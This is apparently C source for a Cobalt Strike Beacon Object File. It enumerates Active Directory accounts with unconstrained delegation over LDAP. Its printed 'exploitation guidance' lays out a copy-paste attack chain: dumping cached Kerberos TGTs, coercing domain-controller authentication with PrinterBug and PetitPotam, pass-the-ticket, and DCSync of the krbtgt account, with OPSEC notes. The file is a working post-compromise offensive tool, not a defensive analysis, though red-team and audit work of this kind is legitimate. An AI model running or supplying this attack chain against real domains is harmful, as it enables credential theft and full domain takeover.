/*
 * krb_unconstrained_enum - Enumerate Unconstrained Delegation
 *
 * Finds all AD objects where unconstrained delegation is enabled.
 * This is indicated by the TRUSTED_FOR_DELEGATION bit (0x80000) in userAccountControl.
 *
 * Separates results into:
 * - Computer accounts with unconstrained delegation
 * - User accounts with unconstrained delegation (rare but possible)
 *
 * Usage: krb_unconstrained_enum [/domain:DOMAIN] [/dc:DC] [/includedcs]
 */

#include "include/krb5_struct.h"
#include "include/krb5_utils.h"
#include "beacon.h"

/* LDAP declarations */
DECLSPEC_IMPORT PVOID WINAPI WLDAP32$ldap_initA(PCHAR, ULONG);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_bind_sA(PVOID, PCHAR, PCHAR, ULONG);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_unbind(PVOID);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_search_sA(PVOID, PCHAR, ULONG, PCHAR, PCHAR*, ULONG, PVOID*);
DECLSPEC_IMPORT PVOID WINAPI WLDAP32$ldap_first_entry(PVOID, PVOID);
DECLSPEC_IMPORT PVOID WINAPI WLDAP32$ldap_next_entry(PVOID, PVOID);
DECLSPEC_IMPORT PCHAR* WINAPI WLDAP32$ldap_get_valuesA(PVOID, PVOID, PCHAR);
DECLSPEC_IMPORT VOID WINAPI WLDAP32$ldap_value_freeA(PCHAR*);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_msgfree(PVOID);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_count_entries(PVOID, PVOID);

/* LDAP constants */
#define LDAP_SCOPE_SUBTREE 2
#define LDAP_AUTH_NEGOTIATE 0x0486
#define LDAP_PORT 389
#define LDAP_SUCCESS 0

/* UAC flags */
#define UAC_TRUSTED_FOR_DELEGATION      0x00080000  /* Unconstrained delegation */
#define UAC_ACCOUNTDISABLE              0x00000002  /* Account disabled */
#define UAC_SERVER_TRUST_ACCOUNT        0x00002000  /* Domain controller */

/* Statistics */
static int g_computers = 0;
static int g_users = 0;
static int g_dcs = 0;

/* Check if account is a domain controller based on SPNs */
static int is_domain_controller(PCHAR* spnVals) {
    if (!spnVals) return 0;

    for (int i = 0; spnVals[i]; i++) {
        /* DCs have GC/ or ldap/ SPNs with domain component */
        if (strstr(spnVals[i], "GC/") != NULL) return 1;
        if (strstr(spnVals[i], "E3514235-4B06-11D1-AB04-00C04FC2DCD2") != NULL) return 1; /* DFSR */
    }
    return 0;
}

/* Enumerate computer accounts with unconstrained delegation */
static void enum_unconstrained_computers(PVOID ldap, const char* searchBase, formatp* output,
                                          int includeDCs, const char* domain, const char* dc) {
    /* LDAP filter: computers with TRUSTED_FOR_DELEGATION (0x80000) and enabled */
    char* filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))";
    char* attrs[] = { "sAMAccountName", "dNSHostName", "userAccountControl",
                      "operatingSystem", "operatingSystemVersion", "servicePrincipalName",
                      "description", NULL };
    PVOID searchResult = NULL;

    BeaconFormatPrintf(output, "=============================================================\n");
    BeaconFormatPrintf(output, "  UNCONSTRAINED DELEGATION: COMPUTER ACCOUNTS\n");
    BeaconFormatPrintf(output, "=============================================================\n\n");

    ULONG ldapResult = WLDAP32$ldap_search_sA(ldap, (PCHAR)searchBase, LDAP_SCOPE_SUBTREE,
                                               filter, attrs, 0, &searchResult);

    if (ldapResult != LDAP_SUCCESS) {
        BeaconFormatPrintf(output, "[-] LDAP search failed: %d\n", ldapResult);
        return;
    }

    int totalCount = WLDAP32$ldap_count_entries(ldap, searchResult);

    /* First pass: count DCs vs non-DCs */
    int dcCount = 0;
    int nonDcCount = 0;
    PVOID entry = WLDAP32$ldap_first_entry(ldap, searchResult);
    while (entry) {
        PCHAR* spnVals = WLDAP32$ldap_get_valuesA(ldap, entry, "servicePrincipalName");
        PCHAR* uacVals = WLDAP32$ldap_get_valuesA(ldap, entry, "userAccountControl");

        DWORD uac = uacVals && uacVals[0] ? (DWORD)atol(uacVals[0]) : 0;
        int isDC = is_domain_controller(spnVals) || (uac & UAC_SERVER_TRUST_ACCOUNT);

        if (isDC) dcCount++;
        else nonDcCount++;

        if (spnVals) WLDAP32$ldap_value_freeA(spnVals);
        if (uacVals) WLDAP32$ldap_value_freeA(uacVals);
        entry = WLDAP32$ldap_next_entry(ldap, entry);
    }

    BeaconFormatPrintf(output, "[*] Found %d computers with unconstrained delegation\n", totalCount);
    BeaconFormatPrintf(output, "    - Domain Controllers: %d (have unconstrained by default)\n", dcCount);
    BeaconFormatPrintf(output, "    - Other Computers:    %d\n\n", nonDcCount);

    g_dcs = dcCount;

    if (nonDcCount == 0 && !includeDCs) {
        BeaconFormatPrintf(output, "[*] No non-DC computers with unconstrained delegation found.\n");
        BeaconFormatPrintf(output, "    Use /includedcs to show domain controllers.\n\n");
        WLDAP32$ldap_msgfree(searchResult);
        return;
    }

    /* Second pass: display results */
    BeaconFormatPrintf(output, "%-25s %-40s %-12s %s\n", "NAME", "DNSHOSTNAME", "UAC", "OS");
    BeaconFormatPrintf(output, "%-25s %-40s %-12s %s\n", "----", "-----------", "---", "--");

    entry = WLDAP32$ldap_first_entry(ldap, searchResult);
    while (entry) {
        PCHAR* nameVals = WLDAP32$ldap_get_valuesA(ldap, entry, "sAMAccountName");
        PCHAR* dnsVals = WLDAP32$ldap_get_valuesA(ldap, entry, "dNSHostName");
        PCHAR* uacVals = WLDAP32$ldap_get_valuesA(ldap, entry, "userAccountControl");
        PCHAR* osVals = WLDAP32$ldap_get_valuesA(ldap, entry, "operatingSystem");
        PCHAR* spnVals = WLDAP32$ldap_get_valuesA(ldap, entry, "servicePrincipalName");

        char* name = nameVals && nameVals[0] ? nameVals[0] : "(unknown)";
        char* dns = dnsVals && dnsVals[0] ? dnsVals[0] : "";
        char* os = osVals && osVals[0] ? osVals[0] : "";
        DWORD uac = uacVals && uacVals[0] ? (DWORD)atol(uacVals[0]) : 0;

        int isDC = is_domain_controller(spnVals) || (uac & UAC_SERVER_TRUST_ACCOUNT);

        /* Skip DCs unless includeDCs is set */
        if (!isDC || includeDCs) {
            /* Truncate strings for formatting */
            char nameBuf[26], dnsBuf[41], osBuf[30];
            strncpy(nameBuf, name, 25); nameBuf[25] = '\0';
            strncpy(dnsBuf, dns, 40); dnsBuf[40] = '\0';
            strncpy(osBuf, os, 29); osBuf[29] = '\0';

            BeaconFormatPrintf(output, "%-25s %-40s 0x%08X  %s", nameBuf, dnsBuf, uac, osBuf);
            if (isDC) BeaconFormatPrintf(output, " [DC]");
            BeaconFormatPrintf(output, "\n");

            if (!isDC) g_computers++;
        }

        if (nameVals) WLDAP32$ldap_value_freeA(nameVals);
        if (dnsVals) WLDAP32$ldap_value_freeA(dnsVals);
        if (uacVals) WLDAP32$ldap_value_freeA(uacVals);
        if (osVals) WLDAP32$ldap_value_freeA(osVals);
        if (spnVals) WLDAP32$ldap_value_freeA(spnVals);

        entry = WLDAP32$ldap_next_entry(ldap, entry);
    }

    WLDAP32$ldap_msgfree(searchResult);
    BeaconFormatPrintf(output, "\n");
}

/* Enumerate user accounts with unconstrained delegation (rare) */
static void enum_unconstrained_users(PVOID ldap, const char* searchBase, formatp* output,
                                      const char* domain, const char* dc) {
    /* LDAP filter: users with TRUSTED_FOR_DELEGATION (0x80000) and enabled */
    char* filter = "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))";
    char* attrs[] = { "sAMAccountName", "userPrincipalName", "userAccountControl",
                      "description", "memberOf", NULL };
    PVOID searchResult = NULL;

    BeaconFormatPrintf(output, "=============================================================\n");
    BeaconFormatPrintf(output, "  UNCONSTRAINED DELEGATION: USER ACCOUNTS (rare)\n");
    BeaconFormatPrintf(output, "=============================================================\n\n");

    ULONG ldapResult = WLDAP32$ldap_search_sA(ldap, (PCHAR)searchBase, LDAP_SCOPE_SUBTREE,
                                               filter, attrs, 0, &searchResult);

    if (ldapResult != LDAP_SUCCESS) {
        BeaconFormatPrintf(output, "[-] LDAP search failed: %d\n", ldapResult);
        return;
    }

    int count = WLDAP32$ldap_count_entries(ldap, searchResult);
    BeaconFormatPrintf(output, "[*] Found %d user accounts with unconstrained delegation\n\n", count);

    if (count == 0) {
        BeaconFormatPrintf(output, "[*] No user accounts with unconstrained delegation found.\n");
        BeaconFormatPrintf(output, "    (This is normal - unconstrained delegation on users is rare)\n\n");
        WLDAP32$ldap_msgfree(searchResult);
        return;
    }

    BeaconFormatPrintf(output, "%-25s %-40s %-12s\n", "SAMACCOUNTNAME", "USERPRINCIPALNAME", "UAC");
    BeaconFormatPrintf(output, "%-25s %-40s %-12s\n", "--------------", "-----------------", "---");

    PVOID entry = WLDAP32$ldap_first_entry(ldap, searchResult);
    while (entry) {
        PCHAR* nameVals = WLDAP32$ldap_get_valuesA(ldap, entry, "sAMAccountName");
        PCHAR* upnVals = WLDAP32$ldap_get_valuesA(ldap, entry, "userPrincipalName");
        PCHAR* uacVals = WLDAP32$ldap_get_valuesA(ldap, entry, "userAccountControl");
        PCHAR* descVals = WLDAP32$ldap_get_valuesA(ldap, entry, "description");

        char* name = nameVals && nameVals[0] ? nameVals[0] : "(unknown)";
        char* upn = upnVals && upnVals[0] ? upnVals[0] : "";
        char* desc = descVals && descVals[0] ? descVals[0] : "";
        DWORD uac = uacVals && uacVals[0] ? (DWORD)atol(uacVals[0]) : 0;

        /* Truncate strings for formatting */
        char nameBuf[26], upnBuf[41];
        strncpy(nameBuf, name, 25); nameBuf[25] = '\0';
        strncpy(upnBuf, upn, 40); upnBuf[40] = '\0';

        BeaconFormatPrintf(output, "%-25s %-40s 0x%08X\n", nameBuf, upnBuf, uac);
        if (desc[0]) {
            BeaconFormatPrintf(output, "    Description: %s\n", desc);
        }

        g_users++;

        if (nameVals) WLDAP32$ldap_value_freeA(nameVals);
        if (upnVals) WLDAP32$ldap_value_freeA(upnVals);
        if (uacVals) WLDAP32$ldap_value_freeA(uacVals);
        if (descVals) WLDAP32$ldap_value_freeA(descVals);

        entry = WLDAP32$ldap_next_entry(ldap, entry);
    }

    WLDAP32$ldap_msgfree(searchResult);
    BeaconFormatPrintf(output, "\n");
}

/* Print exploitation guidance */
static void print_exploitation_guidance(formatp* output, const char* domain, const char* dc) {
    BeaconFormatPrintf(output, "=============================================================\n");
    BeaconFormatPrintf(output, "  EXPLOITATION GUIDANCE\n");
    BeaconFormatPrintf(output, "=============================================================\n\n");

    BeaconFormatPrintf(output, "[*] UNCONSTRAINED DELEGATION ATTACK:\n");
    BeaconFormatPrintf(output, "    When a user authenticates to a service on an unconstrained\n");
    BeaconFormatPrintf(output, "    delegation host, their TGT is cached on that host.\n");
    BeaconFormatPrintf(output, "    If you compromise such a host, you can extract TGTs!\n\n");

    BeaconFormatPrintf(output, "[*] ATTACK VECTORS:\n");
    BeaconFormatPrintf(output, "    1. COMPROMISE the unconstrained delegation host\n");
    BeaconFormatPrintf(output, "    2. COERCE authentication from high-value targets (e.g., DCs)\n");
    BeaconFormatPrintf(output, "    3. EXTRACT cached TGTs from memory\n");
    BeaconFormatPrintf(output, "    4. PASS-THE-TICKET with extracted TGTs\n\n");

    BeaconFormatPrintf(output, "[>] COPY/PASTE COMMANDS:\n");
    BeaconFormatPrintf(output, "------------------------------------------------------------\n");
    BeaconFormatPrintf(output, "# Step 1: After compromising unconstrained delegation host,\n");
    BeaconFormatPrintf(output, "#         dump all cached Kerberos tickets:\n");
    BeaconFormatPrintf(output, "krb_triage\n\n");

    BeaconFormatPrintf(output, "# Step 2: List all tickets in current session:\n");
    BeaconFormatPrintf(output, "krb_klist\n\n");

    BeaconFormatPrintf(output, "# Step 3: Dump TGTs from all logon sessions (requires SYSTEM):\n");
    BeaconFormatPrintf(output, "krb_dump\n\n");

    BeaconFormatPrintf(output, "# Step 4: Monitor for incoming TGTs in real-time:\n");
    BeaconFormatPrintf(output, "krb_monitor /interval:5 /filteruser:administrator\n\n");

    BeaconFormatPrintf(output, "# Step 5: Coerce DC authentication using PrinterBug/PetitPotam:\n");
    BeaconFormatPrintf(output, "#         (Run from attacker machine to trigger auth to unconstrained host)\n");
    if (domain && dc) {
        BeaconFormatPrintf(output, "#         python3 printerbug.py %s/user:pass@%s YOURUNCONSTRAINED_HOST\n", domain, dc);
        BeaconFormatPrintf(output, "#         python3 PetitPotam.py YOURUNCONSTRAINED_HOST %s\n\n", dc);
    } else {
        BeaconFormatPrintf(output, "#         python3 printerbug.py DOMAIN/user:pass@DC YOURUNCONSTRAINED_HOST\n");
        BeaconFormatPrintf(output, "#         python3 PetitPotam.py YOURUNCONSTRAINED_HOST DC\n\n");
    }

    BeaconFormatPrintf(output, "# Step 6: After capturing TGT, pass it to current session:\n");
    BeaconFormatPrintf(output, "krb_ptt /ticket:BASE64_TICKET_HERE\n\n");

    BeaconFormatPrintf(output, "# Step 7: Verify the ticket was imported:\n");
    BeaconFormatPrintf(output, "krb_klist\n\n");

    BeaconFormatPrintf(output, "# Step 8: If you captured a DC$ machine account TGT, DCSync:\n");
    if (domain) {
        BeaconFormatPrintf(output, "dcsync %s YOURDC$ /user:krbtgt\n", domain);
    } else {
        BeaconFormatPrintf(output, "dcsync DOMAIN YOURDC$ /user:krbtgt\n");
    }
    BeaconFormatPrintf(output, "------------------------------------------------------------\n\n");

    BeaconFormatPrintf(output, "[*] OPSEC NOTES:\n");
    BeaconFormatPrintf(output, "    - Ticket extraction requires local admin/SYSTEM on target\n");
    BeaconFormatPrintf(output, "    - Coercion attacks generate authentication events\n");
    BeaconFormatPrintf(output, "    - Monitor Event ID 4624 (Logon) with Logon Type 3\n");
    BeaconFormatPrintf(output, "    - Captured TGTs expire based on domain policy (default 10hrs)\n");
}


void go(char* args, int alen) {
    formatp output;
    ARG_PARSER parser;
    char* domain = NULL;
    char* dc = NULL;
    int includeDCs = 0;

    BeaconFormatAlloc(&output, 65536);
    arg_init(&parser, args, alen);

    BeaconFormatPrintf(&output, "\n[*] Action: Enumerate Unconstrained Delegation\n\n");


    domain = arg_get(&parser, "domain");
    dc = arg_get(&parser, "dc");
    includeDCs = arg_exists(&parser, "includedcs");

    if (!domain) {
        domain = get_domain_from_env();
        if (!domain) {
            BeaconFormatPrintf(&output, "[-] Could not determine domain. Use /domain:DOMAIN\n");
            goto cleanup;
        }
    }

    int dc_allocated = 0;
    if (!dc) {
        dc = domain;
    } else {
        dc_allocated = 1;
    }

    BeaconFormatPrintf(&output, "[*] Domain: %s\n", domain);
    BeaconFormatPrintf(&output, "[*] DC: %s\n", dc);
    if (includeDCs) {
        BeaconFormatPrintf(&output, "[*] Including Domain Controllers in results\n");
    }
    BeaconFormatPrintf(&output, "\n");

    /* Connect via LDAP */
    PVOID ldap = WLDAP32$ldap_initA(dc, LDAP_PORT);
    if (!ldap) {
        BeaconFormatPrintf(&output, "[-] Failed to initialize LDAP connection to %s\n", dc);
        goto cleanup;
    }

    ULONG ldapResult = WLDAP32$ldap_bind_sA(ldap, NULL, NULL, LDAP_AUTH_NEGOTIATE);
    if (ldapResult != LDAP_SUCCESS) {
        BeaconFormatPrintf(&output, "[-] LDAP bind failed: %d\n", ldapResult);
        WLDAP32$ldap_unbind(ldap);
        goto cleanup;
    }

    BeaconFormatPrintf(&output, "[+] LDAP connection established\n\n");

    /* Build search base from domain */
    char searchBase[512];
    char* domainCopy = (char*)malloc(strlen(domain) + 1);
    strcpy(domainCopy, domain);

    strcpy(searchBase, "DC=");
    char* part = strtok(domainCopy, ".");
    int first = 1;
    while (part) {
        if (!first) strcat(searchBase, ",DC=");
        strcat(searchBase, part);
        first = 0;
        part = strtok(NULL, ".");
    }
    free(domainCopy);

    /* Reset counters */
    g_computers = 0;
    g_users = 0;
    g_dcs = 0;

    /* Enumerate computers and users */
    enum_unconstrained_computers(ldap, searchBase, &output, includeDCs, domain, dc);
    enum_unconstrained_users(ldap, searchBase, &output, domain, dc);

    /* Cleanup LDAP */
    WLDAP32$ldap_unbind(ldap);

    /* Summary */
    BeaconFormatPrintf(&output, "=============================================================\n");
    BeaconFormatPrintf(&output, "  SUMMARY\n");
    BeaconFormatPrintf(&output, "=============================================================\n\n");
    BeaconFormatPrintf(&output, "    Computers with Unconstrained Delegation: %d\n", g_computers);
    BeaconFormatPrintf(&output, "    Users with Unconstrained Delegation:     %d\n", g_users);
    BeaconFormatPrintf(&output, "    Domain Controllers (excluded by default):%d\n\n", g_dcs);

    /* Print exploitation guidance if we found targets */
    if (g_computers > 0 || g_users > 0) {
        print_exploitation_guidance(&output, domain, dc);
    } else {
        BeaconFormatPrintf(&output, "[*] No non-DC unconstrained delegation targets found.\n");
        BeaconFormatPrintf(&output, "    This domain may be well-configured!\n");
    }

cleanup:
    if (domain) free(domain);
    if (dc && dc_allocated) free(dc);

    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));
    BeaconFormatFree(&output);
}
